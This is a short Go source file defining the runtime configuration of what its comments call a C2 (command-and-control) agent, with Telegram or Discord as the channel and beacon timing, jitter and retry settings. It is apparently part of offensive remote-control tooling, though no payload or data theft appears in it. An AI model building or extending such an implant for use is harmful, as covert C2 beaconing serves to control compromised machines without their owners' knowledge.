package core

import "time"

// ─────────────────────────────────────────
// Agent configuration
// ─────────────────────────────────────────

// AgentConfig holds runtime settings for the C2 agent.
type AgentConfig struct {
	// Primary channel to connect first ("telegram" or "discord")
	PrimaryChannel string

	// Beacon timing
	PollInterval  time.Duration
	JitterPercent int // 0-100, randomizes poll interval by ±%

	// Retry
	MaxRetries    int
	RetryInterval time.Duration
}

// LoadConfig returns hardcoded config with sane defaults.
func LoadConfig() *AgentConfig {
	return &AgentConfig{
		PrimaryChannel: "telegram",
		PollInterval:   2 * time.Second,
		JitterPercent:  20,
		MaxRetries:     5,
		RetryInterval:  10 * time.Second,
	}
}
